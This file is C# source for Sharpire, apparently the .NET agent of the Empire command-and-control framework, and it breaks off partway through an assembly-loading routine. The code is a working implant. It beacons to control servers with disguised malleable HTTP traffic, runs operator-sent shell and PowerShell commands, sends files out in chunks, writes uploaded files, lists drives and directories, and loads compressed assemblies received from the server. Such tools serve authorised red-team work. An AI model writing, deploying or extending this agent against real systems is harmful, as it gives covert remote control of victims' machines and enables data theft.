using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using AesGcmEncryption;

namespace Sharpire
{
/*

Packet handling functionality for Empire.

Defines packet types, builds tasking packets and parses result packets.

Packet format:

Nonce: Nonce used by AES-GCM
AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
AESc = AES encrypted using the client's session key


    Routing Packet:
    +---------+---------------------------+--------------------------+
    |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
    +---------+---------------------------+--------------------------+
    |    12   |             32            |          length          |
    +---------+---------------------------+--------------------------+

        AES-GCM(RoutingData):
        +---------------------------+---------------------------+
        |   AES-GCM Ciphertext      |       AES-GCM Tag         |
        +---------------------------+---------------------------+
        |           16              |            16             |
        +---------------------------+---------------------------+

            RoutingData (plaintext):
            +-----------+------+------+-------+--------+
            | SessionID | Lang | Meta | Extra | Length |
            +-----------+------+------+-------+--------+
            |    8      |  1   |  1   |   2   |    4   |
            +-----------+------+------+-------+--------+

    SessionID = the sessionID that the packet is bound for
    Lang = indicates the language used
    Meta = indicates staging req/tasking req/result post/etc.
    Extra = reserved for future expansion


    AESc(client data)
    +--------+-----------------+-------+
    | AES IV | Enc Packet Data | HMACc |
    +--------+-----------------+-------+
    |   16   |   % 16 bytes    |  16   |
    +--------+-----------------+-------+

    Client data decrypted:
    +------+--------+--------------------+----------+---------+-----------+
    | Type | Length | total # of packets | packet # | task ID | task data |
    +------+--------+--------------------+--------------------+-----------+
    |  2   |   4    |         2          |    2     |    2    | <Length>  |
    +------+--------+--------------------+----------+---------+-----------+

    type = packet type
    total # of packets = number of total packets in the transmission
    Packet # = where the packet fits in the transmission
    Task ID = links the tasking to results for deconflict on server side


    Client *_SAVE packets have the sub format:

            [15 chars] - save prefix
            [5 chars]  - extension
            [X...]     - tasking data

*/
    class Coms
    {
        public SessionInfo sessionInfo;

        internal int MissedCheckins { get; set; }
        private int ServerIndex = 0;

        private JobTracking jobTracking;

        internal Coms(SessionInfo sessionInfo)
        {
            this.sessionInfo = sessionInfo;
        }

        private byte[] NewRoutingPacket(byte[] encryptedBytes, int meta)
        /*
        Constructs a routing packet with AES-GCM encryption.

        Packet format:

        Nonce: Nonce used by AES-GCM
        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
        AESc = AES encrypted using the client's session key


            Routing Packet:
            +---------+---------------------------+--------------------------+
            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
            +---------+---------------------------+--------------------------+
            |    12   |             32            |          length          |
            +---------+---------------------------+--------------------------+

                AES-GCM(RoutingData):
                +---------------------------+---------------------------+
                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                +---------------------------+---------------------------+
                |           16              |            16             |
                +---------------------------+---------------------------+

                    RoutingData (plaintext):
                    +-----------+------+------+-------+--------+
                    | SessionID | Lang | Meta | Extra | Length |
                    +-----------+------+------+-------+--------+
                    |    8      |  1   |  1   |   2   |    4   |
                    +-----------+------+------+-------+--------+

            SessionID = the sessionID that the packet is bound for
            Lang = indicates the language used
            Meta = indicates staging req/tasking req/result post/etc.
            Extra = reserved for future expansion
        */
        {
            //determine lengths
            int nonce_length = 12;
            int encryptedBytesLength = 0;
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                encryptedBytesLength = encryptedBytes.Length;
            }

            //prepare the routingData
            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentId());
            byte lang = 0x03;
            data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
            data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));

            //encrypt the routingData with AES-GCM
            byte[] gcm_ciphertext = new byte[16];
            byte[] gcm_tag = new byte[16];
            byte[] gcm_nonce = NewInitializationVector(nonce_length);
            AesGcm.Encrypt(sessionInfo.GetStagingKeyBytes(), gcm_nonce, data, out gcm_ciphertext, out gcm_tag);

            //combine the nonce + AES-GCM ciphertext + GCM tag + encryptedBytes (if applicable) into the routingPacketData bytearray
            byte[] routingPacketData = Misc.combine(gcm_nonce, gcm_ciphertext);
            routingPacketData = Misc.combine(routingPacketData, gcm_tag);
            if (encryptedBytes != null && encryptedBytes.Length > 0)
            {
                routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
            }

            return routingPacketData;
        }

        internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
        /*
        Decodes an AES-GCM encrypted routing packet to a normal routing packet

        Packet format:

        Nonce: Nonce used by AES-GCM
        AES-GCM(Routing Data): Encrypted RoutingData with associated GCM tag
        AESc = AES encrypted using the client's session key


            Routing Packet:
            +---------+---------------------------+--------------------------+
            |  Nonce  |  AES-GCM(RoutingData)     | AESc(client packet data) | ...
            +---------+---------------------------+--------------------------+
            |    12   |             32            |          length          |
            +---------+---------------------------+--------------------------+

                AES-GCM(RoutingData):
                +---------------------------+---------------------------+
                |   AES-GCM Ciphertext      |       AES-GCM Tag         |
                +---------------------------+---------------------------+
                |           16              |            16             |
                +---------------------------+---------------------------+

                    RoutingData (plaintext):
                    +-----------+------+------+-------+--------+
                    | SessionID | Lang | Meta | Extra | Length |
                    +-----------+------+------+-------+--------+
                    |    8      |  1   |  1   |   2   |    4   |
                    +-----------+------+------+-------+--------+

            SessionID = the sessionID that the packet is bound for
            Lang = indicates the language used
            Meta = indicates staging req/tasking req/result post/etc.
            Extra = reserved for future expansion
        */
        {
            this.jobTracking = jobTracking;

            // define packet structure for AES-GCM (12 byte nonce + 32 bytes for encrypted data and tag. Together is 44 byte header before AESc)
            int nonce_length = 12;
            int gcm_header_length = nonce_length + 32;
            if (packetData.Length < gcm_header_length)
            {
                return;
            }
            int offset = 0;

            // while we have bytes to read from packetData...
            while (offset < packetData.Length)
            {

                //parse out the routingPacket to the gcmNonce and routingGcmData (AES-GCM ciphertext + GCM tag)
                byte[] routingPacket = packetData.Skip(offset).Take(gcm_header_length).ToArray();
                byte[] gcmNonce = routingPacket.Take(nonce_length).ToArray();
                byte[] routingGcmData = packetData.Skip(nonce_length).Take(32).ToArray();
                offset += gcm_header_length; // advance the offset past the AES-GCM routing packet data (to AESc)

                // decrypt and verify AES-GCM data into output routingData (output decrypted routingpacket)
                byte[] gcmCiphertext = routingGcmData.Take(16).ToArray();
                byte[] gcmTag = routingGcmData.Skip(16).Take(16).ToArray();
                byte[] routingData = new byte[16];
                AesGcm.Decrypt(sessionInfo.GetStagingKeyBytes(), gcmNonce, gcmCiphertext, gcmTag, out routingData);

                // parse/handle the decrypted routingpacket
                string packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
                try
                {
                    byte language = routingPacket[8];
                    byte metaData = routingPacket[9];
                }
                catch (IndexOutOfRangeException) { }

                byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                uint packetLength = BitConverter.ToUInt32(routingData, 12);

                if (sessionInfo.GetAgentId() == packetSessionId)
                {
                    byte[] encryptedData = packetData.Skip(offset).Take(offset + (int)packetLength - 1).ToArray();
                    offset += (int)packetLength;
                    try
                    {
                        ProcessTaskingPackets(encryptedData);
                    }
                    catch (Exception) { }
                }
            }
        }

        internal byte[] GetTask()
        {
            byte[] routingPacket = NewRoutingPacket(null, 4);

            byte[] malleableResult;
            bool malleableUsed = TryMalleableRequest(routingPacket, false, out malleableResult);
            if (malleableUsed)
            {
                if (malleableResult == null) return null;
                string mStr = System.Text.Encoding.UTF8.GetString(malleableResult);
                if (mStr.TrimStart().StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase))
                {
                    return null;
                }
                return malleableResult;
            }

            byte[] results = new byte[0];
            try
            {
                string routingCookie = Convert.ToBase64String(routingPacket);

                WebClient webClient = new WebClient();
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
                webClient.Headers.Add("Cookie", "session=" + routingCookie);

                Random random = new Random();
                string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
                results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
            }
            catch (WebException)
            {
                MissedCheckins++;
                // if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
                // {
                //     //Restart everything
                // }
            }
            string resultStr = System.Text.Encoding.UTF8.GetString(results);
            if (resultStr.TrimStart().StartsWith("<!DOCTYPE", StringComparison.OrdinalIgnoreCase))
            {

                results = null;
            }
            return results;
        }

        internal void SendMessage(byte[] packets)
        {
            byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
            byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);

            byte[] unused;
            if (TryMalleableRequest(routingPacket, true, out unused))
            {
                return;
            }

            Random random = new Random();
            string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];

            if (controlServer.StartsWith("http"))
            {
                WebClient webClient = new WebClient();
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());

                try
                {
                    string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                }
                catch (WebException) { }
            }

        }

        // Issues a request according to a runtime malleable profile. Returns
        // true if the profile was present and the request was attempted (even
        // if it failed) — callers should NOT fall back to the legacy path in
        // that case. Returns false when no profile is configured or the
        // section is malformed, signaling the caller to use the hardcoded
        // behavior.
        //
        // The routing packet is the complete wire payload. Which container
        // carries it mirrors the PS/Python reference agents emitted by
        // http_malleable.py::generate_comms:
        //   - GET  → client.metadata (the only container GET has)
        //   - POST → client.output   (Empire convention — id is a server-side
        //            extract hint only; reference agents ignore it)
        // The server's two-part extractor concatenates id+output, so placing
        // everything on output for POST yields b"" + routing_packet on the
        // wire and keeps AEAD decryption intact.
        private bool TryMalleableRequest(byte[] routingPacket, bool isPost, out byte[] responseBytes)
        {
            responseBytes = null;
            MalleableProfile mp = sessionInfo.GetMalleableProfile();
            if (mp == null || mp.Sections == null) return false;

            string sectionName = isPost ? "post" : "get";
            Section section;
            if (!mp.Sections.TryGetValue(sectionName, out section) || section == null) return false;
            if (section.Client == null || section.Client.Uris == null || section.Client.Uris.Length == 0) return false;
            Container packetContainer = isPost ? section.Client.Output : section.Client.Metadata;
            if (packetContainer == null) return false;

            try
            {
                Random random = new Random();
                string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
                if (controlServer.EndsWith("/")) controlServer = controlServer.Substring(0, controlServer.Length - 1);
                string uri = section.Client.Uris[random.Next(section.Client.Uris.Length)];

                // Seed with the static parameters from the profile before any
                // parameter terminator appends its piece.
                string requestUri = controlServer + uri;
                if (section.Client.Parameters != null && section.Client.Parameters.Count > 0)
                {
                    StringBuilder qs = new StringBuilder();
                    bool first = requestUri.IndexOf('?') < 0;
                    foreach (KeyValuePair<string, string> kv in section.Client.Parameters)
                    {
                        qs.Append(first ? '?' : '&');
                        first = false;
                        qs.Append(Uri.EscapeDataString(kv.Key));
                        qs.Append('=');
                        qs.Append(Uri.EscapeDataString(kv.Value ?? ""));
                    }
                    requestUri += qs.ToString();
                }

                // Seed the body from the static profile body (base64-encoded).
                byte[] staticBody = DecodeBase64Loose(section.Client.Body);

                // Apply the chosen container's transforms to the routing
                // packet; the terminator then picks where the bytes go.
                byte[] packetBytes = MalleableTransform.Apply(packetContainer.Transforms, routingPacket ?? new byte[0]);

                // URI-mutating terminators need to run before we create the
                // HttpWebRequest (immutable URL once constructed). We apply
                // them in-place, falling through to body/header placement after.
                ApplyUriTerminator(packetContainer.Terminator, packetBytes, ref requestUri);

                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(requestUri);
                req.Method = string.IsNullOrEmpty(section.Client.Verb) ? (isPost ? "POST" : "GET") : section.Client.Verb;
                req.Proxy = WebRequest.GetSystemWebProxy();
                req.Proxy.Credentials = CredentialCache.DefaultCredentials;

                // Static headers first — terminator-stored headers will overwrite
                // if they collide.
                if (section.Client.Headers != null)
                {
                    foreach (KeyValuePair<string, string> kv in section.Client.Headers)
                    {
                        ApplyStaticHeader(req, kv.Key, kv.Value);
                    }
                }

                // Body starts as the static client body; a PRINT terminator
                // will append to it by writing combined bytes.
                byte[] bodyAccumulator = staticBody ?? new byte[0];

                bodyAccumulator = PlaceNonUriTerminator(req, packetContainer.Terminator, packetBytes, bodyAccumulator);

                // Commit the body once — if any PRINT terminator fired, we have
                // accumulated bytes; otherwise bodyAccumulator == staticBody.
                if (bodyAccumulator != null && bodyAccumulator.Length > 0)
                {
                    req.ContentLength = bodyAccumulator.Length;
                    using (Stream s = req.GetRequestStream())
                    {
                        s.Write(bodyAccumulator, 0, bodyAccumulator.Length);
                    }
                }

                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    if (section.Server != null && section.Server.Output != null)
                    {
                        byte[] extracted = MalleableTransform.ExtractTerminator(resp, section.Server.Output.Terminator, section.Client.Uris);
                        // NOTE: section.Server.BodyPrefix is intentionally not
                        // honored here — the Python reference (Post.construct_server,
                        // transaction.py::Response.store) does not prepend it, so
                        // stripping it would diverge from the reference.
                        responseBytes = MalleableTransform.Reverse(section.Server.Output.Transforms, extracted);
                    }
                    else
                    {
                        using (Stream rs = resp.GetResponseStream())
                        {
                            using (MemoryStream ms = new MemoryStream())
                            {
                                if (rs != null)
                                {
                                    byte[] buf = new byte[4096];
                                    int n;
                                    while ((n = rs.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, n);
                                }
                                responseBytes = ms.ToArray();
                            }
                        }
                    }
                }
                return true;
            }
            catch (WebException)
            {
                // Preserve legacy side effect: GET increments missed checkins,
                // POST silently swallows.
                if (!isPost) MissedCheckins++;
                responseBytes = null;
                return true;
            }
            catch (Exception)
            {
                // Any non-network failure (e.g. profile ops too narrow) also
                // counts as "attempted" — don't silently revert to legacy so
                // the operator notices the profile is broken rather than
                // leaking plaintext metadata via the hardcoded cookie.
                if (!isPost) MissedCheckins++;
                responseBytes = null;
                return true;
            }
        }

        private static void ApplyUriTerminator(Terminator term, byte[] data, ref string requestUri)
        {
            if (term == null || string.IsNullOrEmpty(term.Type)) return;
            string t = term.Type.ToLowerInvariant();
            if (t == "parameter" || t == "uri-append")
            {
                MalleableTransform.StoreTerminator(null, data, term, ref requestUri);
            }
        }

        // Applies header and PRINT terminators. For PRINT, we accumulate into
        // bodyAccumulator and commit once at the end so multiple PRINT
        // containers (metadata + output on POST) concatenate cleanly.
        private static byte[] PlaceNonUriTerminator(HttpWebRequest req, Terminator term, byte[] data, byte[] bodyAccumulator)
        {
            if (term == null || string.IsNullOrEmpty(term.Type)) return bodyAccumulator;
            string t = term.Type.ToLowerInvariant();
            if (t == "header")
            {
                string placeholder = null;
                MalleableTransform.StoreTerminator(req, data, term, ref placeholder);
                return bodyAccumulator;
            }
            if (t == "print" || t == "")
            {
                byte[] combined = new byte[bodyAccumulator.Length + data.Length];
                Buffer.BlockCopy(bodyAccumulator, 0, combined, 0, bodyAccumulator.Length);
                Buffer.BlockCopy(data, 0, combined, bodyAccumulator.Length, data.Length);
                return combined;
            }
            return bodyAccumulator;
        }

        private static void ApplyStaticHeader(HttpWebRequest req, string name, string value)
        {
            if (string.IsNullOrEmpty(name)) return;
            if (value == null) value = "";
            switch (name.ToLowerInvariant())
            {
                case "user-agent": req.UserAgent = value; break;
                case "accept": req.Accept = value; break;
                case "referer": req.Referer = value; break;
                case "content-type": req.ContentType = value; break;
                case "host": req.Host = value; break;
                case "connection":
                case "content-length":
                case "transfer-encoding":
                case "expect":
                case "date":
                case "if-modified-since":
                case "range":
                    // Managed by the framework — skip.
                    break;
                default:
                    req.Headers[name] = value;
                    break;
            }
        }

        private static byte[] DecodeBase64Loose(string s)
        {
            if (string.IsNullOrEmpty(s)) return new byte[0];
            try
            {
                int pad = s.Length % 4;
                if (pad != 0) s = s + new string('=', 4 - pad);
                return Convert.FromBase64String(s);
            }
            catch (FormatException)
            {
                return new byte[0];
            }
        }

        private void ProcessTaskingPackets(byte[] encryptedTask)
        {
            byte[] taskingBytes = EmpireStager.AesDecryptAndVerify(sessionInfo.GetSessionKeyBytes(), encryptedTask);
            PACKET firstPacket = DecodePacket(taskingBytes, 0);
            byte[] resultPackets = ProcessTasking(firstPacket);
            SendMessage(resultPackets);
        }

        private byte[] ProcessTasking(PACKET packet)
        {
           
            try
            {
                int type = packet.type;
                ushort taskId = packet.taskId;

                if (!jobTracking.jobs.ContainsKey(taskId.ToString()))
                {
                    jobTracking.jobs[taskId.ToString()] = new JobTracking.Job
                    {
                        Status = "started",
                        Thread = null,
                        Language = null,
                        Powershell = new JobTracking.PowershellDetails
                        {
                            AppDomain = null,
                            PsHost = null,
                            Buffer = null,
                            PsHostExec = null
                        }
                    };
                    jobTracking.jobsId[taskId.ToString()] = taskId;
                }

                switch (type)
                {
                    case 1:
                        byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
                        string systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return EncodePacket(1, systemInformation, packet.taskId);
                    case 2:
                        string message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting";
                        SendMessage(EncodePacket(2, message, packet.taskId));
                        Environment.Exit(0);
                        return new byte[0];
                    case 40:
                        string output;
                        // Set-Delay piggybacks on TASK_SHELL for back-compat with the legacy server
                        // tasking that didn't have a dedicated opcode for it.
                        string[] parts = packet.data.Split(' ');
                        if (parts.Length >= 3 && parts[0] == "Set-Delay")
                        {
                            sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                            sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
                            output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
                        }
                        else
                        {
                            output = Agent.InvokeShellCommand(packet.data);
                        }
                        byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return packetBytes;
                    case 41:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return Task41(packet);
                    case 42:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return Task42(packet);
                    case 43:
                        return Task43(packet);
                    case 44:
                        try
                        {
                            string newCwd = Agent.ChangeDirectory(packet.data);
                            jobTracking.jobs[taskId.ToString()].Status = "completed";
                            return EncodePacket(44, newCwd, packet.taskId);
                        }
                        catch (Exception chdirError)
                        {
                            jobTracking.jobs[taskId.ToString()].Status = "error";
                            return EncodePacket(0, "[!] chdir failed: " + chdirError.Message, packet.taskId);
                        }
                    case 50:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return GenerateRunningJobsTable(packet);
                    case 51:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return Task51(packet);
                    case 100:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return EncodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                    case 101:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return Task101(packet);
                    case 102:
                        jobTracking.StartAgentJob(packet.data, packet.taskId);
                        jobTracking.jobs[taskId.ToString()].Status = "running";
                        return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
                    case 120:
                        jobTracking.jobs[taskId.ToString()].Status = "completed";
                        return Task120(packet);
                    case 122:
	                    jobTracking.StartAssemblyJob(packet, packet.taskId);
	                    jobTracking.jobs[taskId.ToString()].Status = "running";
	                    return EncodePacket(packet.type, $"Job started: {taskId}", packet.taskId);
                    default:
                        jobTracking.jobs[taskId.ToString()].Status = "error";
                        return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
                }
            }
            catch (Exception error)
            {
                return EncodePacket(packet.type, "Error running command: " + error, packet.taskId);
            }
        }


        private byte[] GenerateRunningJobsTable(PACKET packet)
        {
            StringBuilder table = new StringBuilder();
            table.AppendLine("Task ID | Status");
            table.AppendLine("----------------");

            foreach (var job in jobTracking.jobs)
            {
                string taskId = job.Key;
                string status = job.Value.Status;
                var unused = table.AppendLine($"{taskId,-7} | {status}");
            }

            string tableString = table.ToString();
            return EncodePacket(packet.type, tableString, packet.taskId);
        }

        internal byte[] EncodePacket(ushort type, string data, ushort resultId)
        {
            data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
            byte[] packet = new byte[12 + data.Length];

            BitConverter.GetBytes((short)type).CopyTo(packet, 0);

            BitConverter.GetBytes((short)1).CopyTo(packet, 2);
            BitConverter.GetBytes((short)1).CopyTo(packet, 4);

            BitConverter.GetBytes((short)resultId).CopyTo(packet, 6);

            BitConverter.GetBytes(data.Length).CopyTo(packet, 8);
            Encoding.UTF8.GetBytes(data).CopyTo(packet, 12);

            return packet;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct PACKET
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public ushort type;
            public ushort totalPackets;
            public ushort packetNumber;
            public ushort taskId;
            public uint length;
            public string data;
            public string remaining;
        };

        private PACKET DecodePacket(byte[] packet, int offset)
        {
            PACKET packetStruct = new PACKET();
            packetStruct.type = BitConverter.ToUInt16(packet, 0 + offset);
            packetStruct.totalPackets = BitConverter.ToUInt16(packet, 2 + offset);
            packetStruct.packetNumber = BitConverter.ToUInt16(packet, 4 + offset);
            packetStruct.taskId = BitConverter.ToUInt16(packet, 6 + offset);
            packetStruct.length = BitConverter.ToUInt32(packet, 8 + offset);
            int dataLength = (int)packetStruct.length;
            byte[] dataBytes = packet.Skip(12 + offset).Take(dataLength).ToArray();
            packetStruct.data = Encoding.UTF8.GetString(dataBytes);
            packet = null;
            return packetStruct;
        }

        internal static byte[] NewInitializationVector(int length)
        {
            Random random = new Random();
            byte[] initializationVector = new byte[length];
            for (int i = 0; i < initializationVector.Length; i++)
            {
                initializationVector[i] = Convert.ToByte(random.Next(0, 255));
            }
            return initializationVector;
        }

        public byte[] Task41(PACKET packet)
        {
            try
            {
                if (string.IsNullOrEmpty(packet.data) || packet.data.Trim().Length == 0)
                    return EncodePacket(0, "Invalid input data", packet.taskId);

                int chunkSize = 512 * 1024;
                string[] packetParts = packet.data.Trim().Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                string path = ParsePath(packetParts, out bool isChunkSizeAdjusted);

                if (isChunkSizeAdjusted)
                {
                    chunkSize = AdjustChunkSize(packetParts.Last());
                }

                chunkSize = Math.Max(64 * 1024, Math.Min(chunkSize, 8 * 1024 * 1024));

                var files = GetTargetFiles(path);
                if (files.Count == 0)
                    return EncodePacket(0, "[!] File does not exist or cannot be accessed", packet.taskId);

                foreach (FileInfo file in files)
                {
                    SendFileInChunks(file, chunkSize, packet);
                }

                return EncodePacket(40, "[*] File download of " + path + " completed", packet.taskId);
            }
            catch (Exception ex)
            {
                return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
            }
        }

        private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
        {
            isChunkSizeAdjusted = false;
            if (parts.Length > 1 && int.TryParse(parts.Last().TrimEnd('b', 'B'), out int _))
            {
                isChunkSizeAdjusted = true;
                return string.Join(" ", parts.Take(parts.Length - 1).ToArray()).Trim('\"', '\'');
            }
            return string.Join(" ", parts).Trim('\"', '\'');
        }


        private int AdjustChunkSize(string lastPart)
        {
            bool isKb = lastPart.EndsWith("b", StringComparison.OrdinalIgnoreCase);
            int size = Convert.ToInt32(lastPart.TrimEnd('b', 'B'));
            return isKb ? size * 1024 : size;
        }

        private List<FileInfo> GetTargetFiles(string path)
        {
            var files = new List<FileInfo>();
            if (File.Exists(path))
            {
                files.Add(new FileInfo(path));
            }
            else if (Directory.Exists(path))
            {
                files.AddRange(new DirectoryInfo(path).GetFiles());
            }
            return files;
        }

        private void SendFileInChunks(FileInfo fileInfo, int chunkSize, PACKET packet)
        {
            int index = 0;
            do
            {
                byte[] filePartBytes = Agent.GetFilePart(fileInfo.FullName, index, chunkSize);
                if (filePartBytes.Length == 0) break;

                string filePart = Convert.ToBase64String(filePartBytes);
                string data = $"{index}|{fileInfo.FullName}|{fileInfo.Length}|{filePart}";
                SendMessage(EncodePacket(packet.type, data, packet.taskId));
                index++;
                int delay = 1000;
                Thread.Sleep(delay);

            } while (true);
        }

        private byte[] Task42(PACKET packet)
        {
            string[] parts = packet.data.Split(new[] { '|' }, 4);
            if (2 > parts.Length)
                return EncodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);

            int chunkIndex;
            int totalChunks;
            string fileName;
            string base64Part;

            if (parts.Length == 4 && int.TryParse(parts[0], out chunkIndex) && int.TryParse(parts[1], out totalChunks))
            {
                fileName = parts[2];
                base64Part = parts[3];
            }
            else
            {
                chunkIndex = 0;
                totalChunks = 1;
                fileName = parts[0];
                base64Part = parts[1];
            }

            byte[] content;
            try
            {
                content = Convert.FromBase64String(base64Part);
            }
            catch (FormatException ex)
            {
                return EncodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
            }

            try
            {
                FileMode mode = (chunkIndex == 0) ? FileMode.Create : FileMode.Append;
                using (FileStream fileStream = File.Open(fileName, mode))
                {
                    using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                    {
                        binaryWriter.Write(content);
                        return EncodePacket(packet.type,
                            "[*] Upload of " + fileName + " successful (chunk " + (chunkIndex + 1) + "/" + totalChunks + ")",
                            packet.taskId);
                    }
                }
            }
            catch (Exception ex)
            {
                return EncodePacket(packet.type, "[!] Error in writing file " + fileName + " during upload: " + ex.Message, packet.taskId);
            }
        }

        public Byte[] Task43(PACKET packet)
        {
            string path = "/";
            StringBuilder sb = new StringBuilder("");
            if (packet.data.Length > 0)
            {
                path = packet.data;
            }

            if (path.Equals("/"))
            {
                // if the path is root, list drives as directories
                sb.Append("{ \"directory_name\": \"/\", \"directory_path\": \"/\", \"items\": [");
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                foreach (DriveInfo d in allDrives)
                {
                    if (d.IsReady == true)
                    {
                        sb.Append("{ \"path\": \"")
                            .Append(d.Name.Replace("\\", "\\\\"))
                            .Append("\", \"name\": \"")
                            .Append(d.Name.Replace("\\", "\\\\"))
                            .Append("\", \"is_file\": ")
                            .Append("false")
                            .Append(" },");
                    }
                }
                sb.Remove(sb.Length - 1, 1);
                sb.Append("] }");
            }
            else if (!Directory.Exists(path))
            {
                sb.Append("Directory " + path + " not found.");
            }
            else
            {
                string fullPath = Path.GetFullPath(path);
                string[] split = fullPath.Split('\\');
                string dirName = split[split.Length - 1];
                sb.Append("{ \"directory_name\": \"")
                    .Append(dirName.Replace("\\", "\\\\"))
                    .Append("\", \"directory_path\": \"")
                    .Append(fullPath.Replace("\\", "\\\\"))
                    .Append("\", \"items\": [");
                string[] fileEntries = Directory.GetFileSystemEntries(path);
                foreach (string filePath in fileEntries)
                {
                    string[] split2 = filePath.Split('\\');
                    string fileName = split2[split2.Length - 1];
                    sb.Append("{ \"path\": \"")
                        .Append(filePath.Replace("\\", "\\\\"))
                        .Append("\", \"name\": \"")
                        .Append(fileName.Replace("\\", "\\\\"))
                        .Append("\", \"is_file\": ")
                        .Append(File.Exists(filePath) ? "true" : "false")
                        .Append(" },");
                }
                sb.Remove(sb.Length - 1, 1);
                sb.Append("] }");
            }
            return EncodePacket(packet.type, sb.ToString(), packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Kill Job
        ////////////////////////////////////////////////////////////////////////////////
        private byte[] Task51(PACKET packet)
        {
            try
            {
                string output = jobTracking.jobs[packet.data].GetOutput();
                if (output.Trim().Length > 0)
                {
                    EncodePacket(packet.type, output, packet.taskId);
                }
                jobTracking.jobs[packet.data].KillThread();
                return EncodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
            }
            catch
            {
                return EncodePacket(packet.type, "[!] Error in stopping job: " + packet.data, packet.taskId);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public byte[] Task101(PACKET packet)
        {
            string prefix = packet.data.Substring(0, 15);
            string extension = packet.data.Substring(15, 5);
            string output = Agent.RunPowerShell(packet.data.Substring(20));
            return EncodePacket(packet.type, prefix + extension + output, packet.taskId);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Run an Agent Job
        ////////////////////////////////////////////////////////////////////////////////
        public Byte[] Task120(PACKET packet)
	{
	    const int MAX_MESSAGE_SIZE = 1048576;
	    string output = "";
	    object synclock = new object(); // Define synclock for synchronization
	    
	    // Split packet data
	    string[] parts = packet.data.Split(',');
	    if (parts.Length > 0)
	    {
		try
		{
		    // Assuming the Base64 encoded JSON is in parts[1]
		    string base64JsonString = parts[1];
		    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
		    
		    // Manually parse JSON to extract all values as a generic string array
		    var parametersList = new List<string>();
		    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
		    string[] keyValuePairs = jsonString.Split(',');
		    
		    foreach (string pair in keyValuePairs)
		    {
		        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
		        if (keyValue.Length == 2)
		        {
		            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
		            parametersList.Add(value);
		        }
		    }
		    
		    // Convert list to array and log the parsed values
		    string[] parameters = parametersList.ToArray();
		    
		    // Decompress and load the assembly
		    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
